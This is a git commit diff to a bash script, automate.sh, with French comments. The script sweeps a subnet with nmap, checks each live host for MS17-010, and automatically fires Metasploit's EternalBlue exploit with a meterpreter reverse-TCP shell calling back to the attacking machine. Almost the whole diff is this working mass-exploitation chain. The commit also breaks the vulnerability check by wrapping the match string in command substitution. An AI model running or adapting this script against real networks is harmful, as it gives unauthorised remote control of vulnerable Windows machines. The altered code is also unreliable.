7644dd06c682a90ed8bb06e62b5f61dc6fda7031
yannisker <35821257+yannisker@users.noreply.github.com>
2021-02-02 12:30:31 +0100

    Update automate.sh

--- automate.sh
+++ automate.sh
@@ -11,7 +11,7 @@
 
 IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)
 
-#Récupérer les hôtes actifs dans un sous-réseau
+#Récupération des hôtes actifs du sous-réseau
 nmap -sn 192.168.100.0/24 | awk '/Nmap scan report for / {print $5}' > hostup.txt
 
 #Compter le nombre de ligne dans un fichier
@@ -19,24 +19,25 @@ SEQ=$(wc -l hostup.txt | awk '{print $1}')
 
 #Check des vulnérabilité sur chaque hôtes actifs
 for i in $(seq 1 $SEQ);do
-LINE=$(cat hostup.txt | awk "NR==$i") #Afficher la première ligne du fichier
+#Afficher la première ligne du fichier
+LINE=$(cat hostup.txt | awk "NR==$i")
+#Scan nmap des vulnérabilités d'un hôte
 nmap -v --script vuln $LINE > LINE$i.txt
 done
 
 #Vérifier qu'un hôte soit vulnérable a la faille MS17-010
-STRING="| smb-vuln-ms17-010:"
+STRING=$("| smb-vuln-ms17-010:")
 
 for i in $(seq 1 $SEQ);do
-LINE=$(cat hostup.txt | awk "NR==$i") #Afficher la première ligne du fichier
-
+#Afficher la première ligne du fichier
+LINE=$(cat hostup.txt | awk "NR==$i")
 if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then
-echo "$LINE is vulnerable to MS17-010";
 
-#Execution de l'exploit
+#Execution de l'exploit MS17_010
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $IP ; set rhost $LINE ; exploit ; "
 
 else
-echo "$LINE is not vulnerable"; 
+echo "No IP are vulnerable"; 
 fi
 done
 
